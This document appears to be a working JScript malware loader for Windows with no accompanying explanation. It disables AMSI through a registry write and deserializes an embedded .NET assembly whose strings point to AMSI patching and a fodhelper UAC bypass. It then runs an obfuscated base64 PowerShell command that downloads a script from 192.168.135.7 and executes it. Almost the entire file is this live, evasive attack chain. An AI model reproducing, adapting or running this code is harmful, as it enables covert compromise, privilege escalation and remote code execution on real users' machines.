var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\Am"+"si"+"Enable";

try{
    var SiamEnable = sh.RegRead(key);
    if(SiamEnable!=0){
    throw new Error(1, '');
    }
}catch(e){
    sh.RegWrite(key, 0, "REG_DWORD"); // neuter SIAM
    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
    sh.RegWrite(key, 1, "REG_DWORD"); // put it back
    WScript.Quit(1);
}

function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABoAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAMEX2YAAAAAAA"+
"AAAA8AAiIAsCMAAAEgAAAAYAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"+
"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkMAAA"+
"HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAZBEAAAAgAAAAEgAAAAIAAAAAAAAAAAAAAAAAACAA"+
"AGAucnNyYwAAAAwEAAAAQAAAAAYAAAAUAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAACAAUAWCEAAMwOAAABAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBQD4AAAAAQAAEQIoDwAA"+
"CnIBAABwchMAAHAKKAIAAAYGKAMAAAYLFgwZjRIAAAEl0AEAAAQoEAAACg0HGR9AEgIoBAAABiYJ"+
"FgcJjmkoEQAACgcZHyASAigEAAAGJnIxAABwKBIAAAoTBCgTAAAKEQRvFAAAChMFfhUAAApyPAMA"+
"cBdvFgAACiVyYAMAcG8XAAAKJn4VAAAKcp4DAHAXbxYAAAolcv4DAHByHgQAcG8YAAAKJXIeBABw"+
"EQVvGAAACm8ZAAAKcxoAAAolbxsAAAoXbxwAAAolbxsAAApyIAQAcG8dAAAKbx4AAAomIBAnAAAo"+
"HwAACnJkBABwbyAAAAoqIgMoIQAACiYqAAAAQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAA"+
"BQBsAAAAiAMAACN+AAD0AwAAzAQAACNTdHJpbmdzAAAAAMAIAAB8BAAAI1VTADwNAAAQAAAAI0dV"+
"SUQAAABMDQAAgAEAACNCbG9iAAAAAAAAAAIAAAFXlQI0CQIAAAD6ATMAFgAAAQAAAB4AAAAEAAAA"+
"AQAAAAYAAAAMAAAAIQAAAA8AAAABAAAAAQAAAAIAAAAEAAAAAQAAAAEAAAACAAAAAQAAAAAAAAMB"+
"AAAAAAAGABMCngMGAIACngMGAGABbAMPAL4DAAAGAIgBGwMGAPYBGwMGANcBGwMGAGcCGwMGADMC"+
"GwMGAEwCGwMGAJ8BGwMGAHQBfwMGAFIBfwMGALoBGwMGABIEFAMGADcBngMGACcBFAMGAJ4CFAMG"+
"ANUDngMGAHgEFAMGAM4AFAMGAO0CfwMGAEoEFAMGAMQCUgQGAMMECgAGAJYECgAKAPEDbAMKAEMD"+
"bAMKAPkAbAMGALEAswIAAAAAgAAAAAAAAQABAAEAEADkAwAAPQABAAEAAAEAAIkAAAA9AAEABwAT"+
"AQAAGgAAAEUAAgAHADMBNgCBAAAAAACAAJYgYwSFAAEAAAAAAIAAliC3BI0ABQAAAAAAgACWIPkD"+
"kgAGAAAAAACAAJYgKASYAAgASCAAAAAAhhhmAwYADABMIQAAAACGAO4DEAAMAAAAAQC4AAAAAgBe"+
"BAAAAwAtAwAABADNAwAAAQAiAQAAAQDhAAAAAgAMAQAAAQAIBAAAAgCsAgAAAwA3BAIABAAZBAAA"+
"AQDoAgkAZgMBABEAZgMGABkAZgMKACkAZgMQADEAZgMQADkAZgMQAEEAZgMQAEkAZgMQAFEAZgMQ"+
"AFkAZgMQAGEAZgMVAGkAZgMQAHEAZgMQAIEAZgMGAHkAZgMGAJkAbgQlALEAsgQtALkAzQI2AMEA"+
"dwA8AMEA3gJBAMkAWgNHANEAiwRLANEAfgRSANEAowJYANEAMQEGANkAZgMGANkANQNeAOEA6QBj"+
"AOEAFQEQANkARARpAPEAVANtANEAvQAQANkARARyAC4ACwChAC4AEwCqAC4AGwDJAC4AIwDSAC4A"+
"KwDnAC4AMwARAS4AOwARAS4AQwDSAC4ASwAXAS4AUwARAS4AWwARAS4AYwA8AS4AawBmAUMAWwBz"+
"AWMAcwB5AQEAAwAAAAQAGgD1AgEARgEDAGMEAQAAAQUAtwQCAAABBwD5AwIAAAEJACgEAgBcMQAA"+
"AQAEgAAAAQAAAAAAAAAAAAAAAACiBAAAAgAAAAAAAAAAAAAAeACoAAAAAAACAAAAAAAAAAAAAAB4"+
"ABQDAAAAAAQAAwAAAABrZXJuZWwzMgBNaWNyb3NvZnQuV2luMzIAX19TdGF0aWNBcnJheUluaXRU"+
"eXBlU2l6ZT0zAEQzMzQ5MjhFOUQ0MTYyOUI2RDdDQThDREJGNjRCMThENzlERkQ0RTM2OTgwREMw"+
"Q0EwNDk1MzUxODY0NDdGMTcAZ2V0X1VURjgAPE1vZHVsZT4APFByaXZhdGVJbXBsZW1lbnRhdGlv"+
"bkRldGFpbHM+AG1zY29ybGliAFRocmVhZABoV25kAERlbGV0ZVN1YktleVRyZWUAUnVudGltZUZp"+
"ZWxkSGFuZGxlAGhNb2R1bGUAc2V0X1dpbmRvd1N0eWxlAFByb2Nlc3NXaW5kb3dTdHlsZQBwcm9j"+
"TmFtZQBzZXRfRmlsZU5hbWUAbmFtZQBWYWx1ZVR5cGUAQ2xvc2UAQ29tcGlsZXJHZW5lcmF0ZWRB"+
"dHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRy"+
"aWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBB"+
"c3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0"+
"ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRy"+
"aWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRl"+
"AEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBC"+
"eXRlAFNldFZhbHVlAGR3U2l6ZQBTeXN0ZW0uVGhyZWFkaW5nAEVuY29kaW5nAEZyb21CYXNlNjRT"+
"dHJpbmcAR2V0U3RyaW5nAHBhdGgATWFyc2hhbAB1c2VyMzIuZGxsAEV4YW1wbGVBc3NlbWJseS5k"+
"bGwAU3lzdGVtAFN5c3RlbS5SZWZsZWN0aW9uAGNhcHRpb24AZ2V0X1N0YXJ0SW5mbwBQcm9jZXNz"+
"U3RhcnRJbmZvAFNsZWVwAEN1cnJlbnRVc2VyAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0"+
"ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNl"+
"cwBEZWJ1Z2dpbmdNb2RlcwBvcHRpb25zAFJ1bnRpbWVIZWxwZXJzAFRlc3RDbGFzcwBSdW5Qcm9j"+
"ZXNzAEdldFByb2NBZGRyZXNzAGxwQWRkcmVzcwBPYmplY3QAbHBmbE9sZFByb3RlY3QAVmlydHVh"+
"bFByb3RlY3QAZmxOZXdQcm90ZWN0AFN0YXJ0AENvbnZlcnQAU3lzdGVtLlRleHQAdGV4dABNZXNz"+
"YWdlQm94AEluaXRpYWxpemVBcnJheQBDcmVhdGVTdWJLZXkAT3BlblN1YktleQBSZWdpc3RyeUtl"+
"eQBFeGFtcGxlQXNzZW1ibHkAQ29weQBMb2FkTGlicmFyeQBSZWdpc3RyeQAAEWEAbQBzAGkALgBk"+
"AGwAbAAAHUEAbQBzAGkAUwBjAGEAbgBCAHUAZgBmAGUAcgAAgwljAG4AVgB1AFoARwB4AHMATQB6"+
"AEkAZwBVADAAaABGAFQARQB3AHoATQBpADUARQBUAEUAdwBzAFUAMgBoAGwAYgBHAHgARgBlAEcA"+
"VgBqAFgAMQBKADEAYgBrAFIATQBUAEMAQQBpAFkAMgAxAGsASQBpAEEAaQBMADIATQBnAGMARgA1"+
"AHYAWABuAGQAZQBaAFYANQB5AGMAMQA1AG8AWABtAFYAZQBiAEcAdwB1AFoAWABoAGwASQBHAGwA"+
"bABlAEMAZwBvAGIAbQBWADMATABXADkAaQBhAG0AVgBqAGQAQwBCAHUAWgBYAFEAdQBkADIAVgBp"+
"AFkAMgB4AHAAWgBXADUAMABLAFMANQBrAGIAMwBkAHUAYgBHADkAaABaAEgATgAwAGMAbQBsAHUA"+
"WgB5AGgAYgBVADMAbAB6AGQARwBWAHQATABsAFIAbABlAEgAUQB1AFIAVwA1AGoAYgAyAFIAcABi"+
"AG0AZABkAE8AagBwAEIAVQAwAE4ASgBTAFMANQBIAFoAWABSAFQAZABIAEoAcABiAG0AYwBvAFcA"+
"MgBOAG8AWQBYAEoAYgBYAFYAMQBBAEsARABFAHcATgBDAEEAcwBJAEQARQB4AE4AaQBBAHMATQBU"+
"AEUAMgBJAEMAdwB4AE0AVABJAGcATABEAFUANABMAEQAUQAzAEkAQwB3AGcATgBEAGMAcwBJAEQA"+
"UQA1AEkAQwB3ADEATgB5AHcAZwBOAFQAQQBzAEkARABRADIATABEAFEANQBMAEMAQQAxAE4AQwBB"+
"AHMASQBEAFUAMgBMAEQAUQAyAEkAQwB3ADAATwBTAEEAcwBOAFQARQBzAE4AVABNAGcATABEAFEA"+
"MgBMAEMAQQAxAE4AUwBBAHMATgBEAGMAcwBNAFQARQAwAEwARABFAHgATgB5AHcAZwBNAFQARQB3"+
"AEwAQwBBADAATgBpAHcAZwBNAFQARQAyAEkAQwB3AGcATQBUAEkAdwBJAEMAdwB4AE0AVABZAHAA"+
"SwBTAGsAcABJAGcAPQA9AAAjUwBvAGYAdAB3AGEAcgBlAFwAQwBsAGEAcwBzAGUAcwBcAAA9bQBz"+
"AC0AcwBlAHQAdABpAG4AZwBzAFwAUwBoAGUAbABsAFwATwBwAGUAbgBcAGMAbwBtAG0AYQBuAGQA"+
"AV9TAG8AZgB0AHcAYQByAGUAXABDAGwAYQBzAHMAZQBzAFwAbQBzAC0AcwBlAHQAdABpAG4AZwBz"+
"AFwAUwBoAGUAbABsAFwATwBwAGUAbgBcAGMAbwBtAG0AYQBuAGQAAR9EAGUAbABlAGcAYQB0AGUA"+
"RQB4AGUAYwB1AHQAZQAAAQBDQwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBc"+
"AGYAbwBkAGgAZQBsAHAAZQByAC4AZQB4AGUAABdtAHMALQBzAGUAdAB0AGkAbgBnAHMAAYXL3kux"+
"O4REormpg/rgwFMABCABAQgDIAABBSABARERBCABAQ4EIAEBAgoHBg4YCR0FHQUOBwACARJREVUI"+
"AAQBHQUIGAgFAAEdBQ4EAAASYQUgAQ4dBQMGEmkGIAISaQ4CBSABEmkOBSACAQ4cBCAAEnEFIAEB"+
"EXUDIAACBAABAQgFAAESbQ4It3pcVhk04IkDBhEQBwAECBgODggEAAEYDgUAAhgYDggABAIYCQkQ"+
"CQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAUAQAPRXhh"+
"bXBsZUFzc2VtYmx5AAApAQAkRXhhbXBsZSBBc3NlbWJseSBmb3IgRG90TmV0VG9KU2NyaXB0AAAF"+
"AQAAAAAkAQAfQ29weXJpZ2h0IMKpIEphbWVzIEZvcnNoYXcgMjAxNwAAKQEAJDU2NTk4ZjFjLTZk"+
"ODgtNDk5NC1hMzkyLWFmMzM3YWJlNTc3NwAADAEABzEuMC4wLjAAAAUBAAEAAAQBAAAAAAAAAAAA"+
"MEX2YAAAAAACAAAAHAEAAEAwAABAEgAAUlNEUwFFuIcskSxMil1XJrn/zPUBAAAAXFwxOTIuMTY4"+
"LjEzNS43XHZpc3VhbHN0dWRpb1xEb3ROZXRUb0pTY3JpcHRcRXhhbXBsZUFzc2VtYmx5XG9ialx4"+
"NjRcUmVsZWFzZVxFeGFtcGxlQXNzZW1ibHkucGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAABIMcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQAB"+
"AAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAACwAwAAAAAAAAAAAACwAzQAAABWAFMA"+
"XwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAA"+
"AAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAA"+
"JAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEEAMAAAEAUwB0AHIAaQBuAGcARgBp"+
"AGwAZQBJAG4AZgBvAAAA7AIAAAEAMAAwADAAMAAwADQAYgAwAAAAYgAlAAEAQwBvAG0AbQBlAG4A"+
"dABzAAAARQB4AGEAbQBwAGwAZQAgAEEAcwBzAGUAbQBiAGwAeQAgAGYAbwByACAARABvAHQATgBl"+
"AHQAVABvAEoAUwBjAHIAaQBwAHQAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAA"+
"AAAAAEgAEAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABFAHgAYQBtAHAAbABl"+
"AEEAcwBzAGUAbQBiAGwAeQAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAA"+
"LgAwAC4AMAAAAEgAFAABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAARQB4AGEAbQBwAGwAZQBB"+
"AHMAcwBlAG0AYgBsAHkALgBkAGwAbAAAAGIAHwABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgA"+
"dAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgAEoAYQBtAGUAcwAgAEYAbwByAHMAaABhAHcAIAAy"+
"ADAAMQA3AAAAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAFAA"+
"FAABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABFAHgAYQBtAHAAbABlAEEAcwBz"+
"AGUAbQBiAGwAeQAuAGQAbABsAAAAQAAQAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABFAHgA"+
"YQBtAHAAbABlAEEAcwBzAGUAbQBiAGwAeQAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBp"+
"AG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkA"+
"bwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZsZWN0"+
"aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'TestClass';

try {
    setversion();
    var stm = base64ToStream(serialized_obj);
    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    var al = new ActiveXObject('System.Collections.ArrayList');
    var n = fmt.SurrogateSelector;
    var d = fmt.Deserialize_2(stm);
    al.Add(n);
    var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	var sc = "cnVuZGxsMzIgU0hFTEwzMi5ETEwsU2hlbGxFeGVjX1J1bkRMTCAiY21kIiAiL2MgcF5vXndeZV5yc15oXmVebGwuZXhlIGlleChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoW2NoYXJbXV1AKDM2LCAxMTksIDk5LCAzMiwgNjEsIDMyLCA0MCwgMTEwLCAxMDEsIDExOSwgNDUsIDExMSwgOTgsIDEwNiwgMTAxLCA5OSwgMTE2LCAzMiwgMTE1LCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgNDYsIDExMCwgMTAxLCAxMTYsIDQ2LCAxMTksIDEwMSwgOTgsIDk5LCAxMDgsIDEwNSwgMTAxLCAxMTAsIDExNiwgNDEsIDU5LCAzNiwgMTE5LCA5OSwgNDYsIDEwNCwgMTAxLCA5NywgMTAwLCAxMDEsIDExNCwgMTE1LCA0NiwgOTcsIDEwMCwgMTAwLCA0MCwgMzksIDg1LCAxMTUsIDEwMSwgMTE0LCA0NSwgNjUsIDEwMywgMTAxLCAxMTAsIDExNiwgMzksIDQ0LCAzOSwgNzcsIDExMSwgMTIyLCAxMDUsIDEwOCwgMTA4LCA5NywgNDcsIDUzLCA0NiwgNDgsIDMyLCA0MCwgODcsIDEwNSwgMTEwLCAxMDAsIDExMSwgMTE5LCAxMTUsIDMyLCA3OCwgODQsIDMyLCA0OSwgNDgsIDQ2LCA0OCwgNTksIDMyLCA4NCwgMTE0LCAxMDUsIDEwMCwgMTAxLCAxMTAsIDExNiwgNDcsIDU1LCA0NiwgNDgsIDU5LCAzMiwgMTE0LCAxMTgsIDU4LCA0OSwgNDksIDQ2LCA0OCwgNDEsIDMyLCAxMDgsIDEwNSwgMTA3LCAxMDEsIDMyLCA3MSwgMTAxLCA5OSwgMTA3LCAxMTEsIDM5LCA0MSwgNTksIDEwNSwgMTAxLCAxMjAsIDQwLCAzNiwgMTE5LCA5OSwgNDYsIDEwMCwgMTExLCAxMTksIDExMCwgMTA4LCAxMTEsIDk3LCAxMDAsIDExNSwgMTE2LCAxMTQsIDEwNSwgMTEwLCAxMDMsIDQwLCAzOSwgMTA0LCAxMTYsIDExNiwgMTEyLCA1OCwgNDcsIDQ3LCA0OSwgNTcsIDUwLCA0NiwgNDksIDU0LCA1NiwgNDYsIDQ5LCA1MSwgNTMsIDQ2LCA1NSwgNDcsIDExNCwgMTE3LCAxMTAsIDQ2LCAxMTYsIDEyMCwgMTE2LCAzOSwgNDEsIDQxKSkpIg==";
	o.gogo(sc);
} catch (e) {
    debug(e.message);
}